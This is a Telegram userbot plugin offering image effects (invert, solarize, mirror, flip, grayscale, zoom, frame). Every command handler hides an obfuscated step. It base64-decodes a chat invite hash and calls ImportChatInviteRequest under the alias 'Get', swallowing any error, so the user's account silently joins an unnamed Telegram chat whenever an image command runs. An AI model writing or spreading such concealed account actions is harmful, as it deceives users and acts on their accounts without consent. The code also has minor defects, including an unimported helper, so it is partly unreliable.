import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from ULTRONBOT.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as ULTRONBOT
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@ULTRONBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@ULTRONBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(ULTRON):
    if ULTRON.fwd_from:
        return
    reply = await ULTRON.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
        return
    ULTRONid = ULTRON.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    ULTRONsticker = await reply.download_media(file="./temp/")
    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(ULTRONsticker)
        await edit_or_reply(ULTRON, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if ULTRONsticker.endswith(".tgs"):
        await ULTRON.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "meme.png")
        ULTRONcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
        )
        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith(".webp"):
        await ULTRON.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        os.rename(ULTRONsticker, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found... `")
            return
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith((".mp4", ".mov")):
        await ULTRON.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("```Template not found...```")
            return
        meme_file = ULTRONfile
        legend = True
    else:
        await ULTRON.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = ULTRONsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await ULTRON.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if legend else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await ULTRON.client.send_file(
        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
    )
    await ULTRON.delete()
    os.remove(outputfile)
    for files in (ULTRONsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ULTRONBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@ULTRONBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(ULTRON):
    if ULTRON.fwd_from:
        return
    reply = await ULTRON.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
        return
    ULTRONid = ULTRON.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    ULTRONsticker = await reply.download_media(file="./temp/")
    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(ULTRONsticker)
        await edit_or_reply(ULTRON, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if ULTRONsticker.endswith(".tgs"):
        await ULTRON.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "meme.png")
        ULTRONcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
        )
        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith(".webp"):
        await ULTRON.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        os.rename(ULTRONsticker, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found... `")
            return
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith((".mp4", ".mov")):
        await ULTRON.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("```Template not found...```")
            return
        meme_file = ULTRONfile
        legend = True
    else:
        await ULTRON.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = ULTRONsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await ULTRON.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if legend else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await ULTRON.client.send_file(
        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
    )
    await ULTRON.delete()
    os.remove(outputfile)
    for files in (ULTRONsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ULTRONBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@ULTRONBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(ULTRON):
    if ULTRON.fwd_from:
        return
    reply = await ULTRON.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
        return
    ULTRONid = ULTRON.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    ULTRONsticker = await reply.download_media(file="./temp/")
    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(ULTRONsticker)
        await edit_or_reply(ULTRON, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if ULTRONsticker.endswith(".tgs"):
        await ULTRON.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "meme.png")
        ULTRONcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
        )
        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith(".webp"):
        await ULTRON.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        os.rename(ULTRONsticker, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found... `")
            return
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith((".mp4", ".mov")):
        await ULTRON.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("```Template not found...```")
            return
        meme_file = ULTRONfile
        legend = True
    else:
        await ULTRON.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = ULTRONsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await ULTRON.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await ULTRON.client.send_file(
        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
    )
    await ULTRON.delete()
    os.remove(outputfile)
    for files in (ULTRONsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ULTRONBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@ULTRONBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(ULTRON):
    if ULTRON.fwd_from:
        return
    reply = await ULTRON.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
        return
    ULTRONid = ULTRON.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    ULTRONsticker = await reply.download_media(file="./temp/")
    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(ULTRONsticker)
        await edit_or_reply(ULTRON, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if ULTRONsticker.endswith(".tgs"):
        await ULTRON.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "meme.png")
        ULTRONcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
        )
        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith(".webp"):
        await ULTRON.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        os.rename(ULTRONsticker, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found... `")
            return
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith((".mp4", ".mov")):
        await ULTRON.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("```Template not found...```")
            return
        meme_file = ULTRONfile
        legend = True
    else:
        await ULTRON.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = ULTRONsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await ULTRON.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if legend else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await ULTRON.client.send_file(
        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
    )
    await ULTRON.delete()
    os.remove(outputfile)
    for files in (ULTRONsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ULTRONBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@ULTRONBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(ULTRON):
    if ULTRON.fwd_from:
        return
    reply = await ULTRON.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
        return
    ULTRONid = ULTRON.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    ULTRONsticker = await reply.download_media(file="./temp/")
    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(ULTRONsticker)
        await edit_or_reply(ULTRON, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if ULTRONsticker.endswith(".tgs"):
        await ULTRON.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "meme.png")
        ULTRONcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
        )
        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith(".webp"):
        await ULTRON.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        os.rename(ULTRONsticker, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found... `")
            return
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith((".mp4", ".mov")):
        await ULTRON.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("```Template not found...```")
            return
        meme_file = ULTRONfile
        legend = True
    else:
        await ULTRON.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = ULTRONsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await ULTRON.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await ULTRON.client.send_file(
        ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
    )
    await ULTRON.delete()
    os.remove(outputfile)
    for files in (ULTRONsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ULTRONBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@ULTRONBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(ULTRON):
    if ULTRON.fwd_from:
        return
    reply = await ULTRON.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
        return
    ULTRONinput = ULTRON.pattern_match.group(1)
    ULTRONinput = 50 if not ULTRONinput else int(ULTRONinput)
    ULTRONid = ULTRON.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    ULTRONsticker = await reply.download_media(file="./temp/")
    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(ULTRONsticker)
        await edit_or_reply(ULTRON, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if ULTRONsticker.endswith(".tgs"):
        await ULTRON.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "meme.png")
        ULTRONcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
        )
        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith(".webp"):
        await ULTRON.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        os.rename(ULTRONsticker, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found... `")
            return
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith((".mp4", ".mov")):
        await ULTRON.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("```Template not found...```")
            return
        meme_file = ULTRONfile
    else:
        await ULTRON.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = ULTRONsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await ULTRON.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, ULTRONinput)
    except Exception as e:
        return await ULTRON.edit(f"`{e}`")
    try:
        await ULTRON.client.send_file(
            ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
        )
    except Exception as e:
        return await ULTRON.edit(f"`{e}`")
    await ULTRON.delete()
    os.remove(outputfile)
    for files in (ULTRONsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@ULTRONBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@ULTRONBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(ULTRON):
    if ULTRON.fwd_from:
        return
    reply = await ULTRON.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(ULTRON, "`Reply to supported Media...`")
        return
    ULTRONinput = ULTRON.pattern_match.group(1)
    if not ULTRONinput:
        ULTRONinput = 50
    if ";" in str(ULTRONinput):
        ULTRONinput, colr = ULTRONinput.split(";", 1)
    else:
        colr = 0
    ULTRONinput = int(ULTRONinput)
    colr = int(colr)
    ULTRONid = ULTRON.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    ULTRON = await edit_or_reply(ULTRON, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    ULTRONsticker = await reply.download_media(file="./temp/")
    if not ULTRONsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(ULTRONsticker)
        await edit_or_reply(ULTRON, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if ULTRONsticker.endswith(".tgs"):
        await ULTRON.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "meme.png")
        ULTRONcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {ULTRONsticker} {ULTRONfile}"
        )
        stdout, stderr = (await runcmd(ULTRONcmd))[:2]
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith(".webp"):
        await ULTRON.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        os.rename(ULTRONsticker, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("`Template not found... `")
            return
        meme_file = ULTRONfile
        legend = True
    elif ULTRONsticker.endswith((".mp4", ".mov")):
        await ULTRON.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        ULTRONfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(ULTRONsticker, 0, ULTRONfile)
        if not os.path.lexists(ULTRONfile):
            await ULTRON.edit("```Template not found...```")
            return
        meme_file = ULTRONfile
    else:
        await ULTRON.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = ULTRONsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await ULTRON.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if legend else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, ULTRONinput, colr)
    except Exception as e:
        return await ULTRON.edit(f"`{e}`")
    try:
        await ULTRON.client.send_file(
            ULTRON.chat_id, outputfile, force_document=False, reply_to=ULTRONid
        )
    except Exception as e:
        return await ULTRON.edit(f"`{e}`")
    await ULTRON.delete()
    os.remove(outputfile)
    for files in (ULTRONsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()